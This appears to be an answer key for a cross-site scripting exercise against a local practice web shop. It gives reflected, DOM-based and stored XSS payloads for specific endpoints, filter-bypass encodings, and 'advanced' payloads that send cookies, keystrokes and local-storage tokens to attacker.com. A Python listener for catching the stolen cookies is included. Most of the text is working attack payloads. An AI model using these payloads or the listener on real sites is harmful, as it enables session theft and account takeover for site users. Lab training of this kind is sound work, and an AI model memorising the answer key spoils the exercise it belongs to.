# Exercise 03: Cross-Site Scripting (XSS) - ANSWERS

## Task 3.1: Reflected XSS

### Vulnerable Endpoint:
**Track Order Page:** `http://localhost:3000/#/track-result?id=`

### Solution:

**URL Payload:**
```
http://localhost:3000/#/track-result?id=<iframe src="javascript:alert('XSS')">
```

**Alternative Payloads:**
```html
http://localhost:3000/#/track-result?id=<img src=x onerror=alert('XSS')>
http://localhost:3000/#/track-result?id=<script>alert('XSS')</script>
```

### Step-by-Step:

1. Navigate to order tracking: `http://localhost:3000/#/track-result`
2. Enter a tracking ID with XSS payload
3. Or directly use the URL with payload in `id` parameter
4. Alert box pops up confirming XSS

### Why It Works:
The order ID is reflected directly into the DOM without proper sanitization.

---

## Task 3.2: DOM-Based XSS

### Vulnerable Endpoint:
**Search Functionality (via URL hash)**

### Solution:

**URL Payload:**
```
http://localhost:3000/#/search?q=<img src=x onerror=alert('XSS')>
```

**Alternative DOM-XSS Payloads:**
```html
http://localhost:3000/#/search?q=<iframe src="javascript:alert(document.cookie)">
http://localhost:3000/#/search?q=<svg onload=alert('XSS')>
```

### Another DOM-XSS Location:

**Score Board Challenge using sanitized HTML:**
```
http://localhost:3000/#/about
```

Inject through the contact form or product reviews.

### Step-by-Step:

1. Navigate to search page
2. Observe the URL structure with `q` parameter
3. Inject XSS payload in the `q` parameter
4. The payload executes in the DOM

### Why It Works:
Client-side JavaScript reads from the URL hash and inserts it into the DOM without sanitization.

---

## Task 3.3: Stored XSS

### Vulnerable Endpoint:
**Customer Feedback / Product Reviews**

### Solution for Customer Feedback:

1. Navigate to `http://localhost:3000/#/contact`
2. In the Comment field, enter:
```html
<iframe src="javascript:alert('Stored XSS')">
```
3. Fill other required fields and submit
4. Navigate to Administration panel: `http://localhost:3000/#/administration`
5. View customer feedback - XSS executes

### Solution for Product Reviews:

1. Select any product
2. Write a review with XSS payload:
```html
<img src=x onerror=alert('XSS')>
```
3. Submit the review
4. Anyone viewing the product will trigger XSS

### Alternative Stored XSS Payloads:

```html
<!-- Basic iframe -->
<iframe src="javascript:alert(document.domain)">

<!-- SVG based -->
<svg onload=alert('XSS')>

<!-- Image error -->
<img src=x onerror="alert(document.cookie)">

<!-- Body onload -->
<body onload=alert('XSS')>

<!-- Input autofocus -->
<input autofocus onfocus=alert('XSS')>
```

---

## Advanced XSS Attacks

### Cookie Stealing Payload:
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### Keylogger Payload:
```html
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?k='+e.key);
}
</script>
```

### Session Hijacking:
```html
<script>
new Image().src='http://attacker.com/collect?token='+localStorage.getItem('token');
</script>
```

---

## XSS Filter Bypass Techniques

### HTML Encoding:
```html
<img src=x onerror=alert&#40;'XSS'&#41;>
```

### Case Mixing:
```html
<ScRiPt>alert('XSS')</sCrIpT>
```

### Without Quotes:
```html
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

### Double Encoding:
```html
%253Cscript%253Ealert('XSS')%253C/script%253E
```

### Using SVG:
```html
<svg/onload=alert('XSS')>
```

---

## Summary:

```
Reflected XSS:
- Location: /#/track-result?id=
- Payload: <iframe src="javascript:alert('XSS')">

DOM-Based XSS:
- Location: /#/search?q=
- Payload: <img src=x onerror=alert('XSS')>

Stored XSS:
- Location: Customer Feedback form
- Payload: <iframe src="javascript:alert('XSS')">
- Trigger: Admin panel viewing feedback

Bypass Techniques Used:
1. iframe with javascript: protocol
2. onerror event handlers
3. SVG onload events
```

---

## Impact Demonstration Script:

```python
#!/usr/bin/env python3
"""Demonstrate XSS impact by stealing cookies"""

import requests
from http.server import HTTPServer, BaseHTTPRequestHandler

class LogHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[!] Captured: {self.path}")
        self.send_response(200)
        self.end_headers()

# Start listener to capture stolen data
print("[*] Listening for stolen cookies on port 8888...")
HTTPServer(('0.0.0.0', 8888), LogHandler).serve_forever()
```
